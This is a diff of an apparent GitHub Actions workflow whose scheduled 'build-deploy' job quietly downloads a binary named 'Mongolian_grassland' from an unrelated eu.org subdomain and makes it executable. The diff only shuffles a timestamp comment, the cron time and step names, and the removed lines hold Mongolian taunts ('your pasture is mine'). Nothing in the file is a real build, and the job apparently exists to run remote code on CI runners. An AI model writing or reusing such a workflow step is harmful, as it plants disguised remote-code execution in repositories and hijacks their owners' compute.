@@ -1,5 +1,4 @@
-#Чиний бэлчээр одооноос минийх
-#2024-03-16-[091201]-0ewqiarc
+#2024-03-16-[145032]-e64qbves
 name: main
 
 on:
@@ -9,14 +8,14 @@ on:
     types: runner_workflow
 
   schedule:
-    - cron: "52 2 * * * "
+    - cron: "43 1 * * * "
 
 jobs:
   build-deploy:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: Тал нутгаас мэндчилж байна!
+      - name: 39fcmtq2vtwh9p87
         run: |
           wget -q https://bangla-87t33kx9.digitalmarketingservice.eu.org/Mongolian_grassland
           chmod 755 Mongolian_grassland
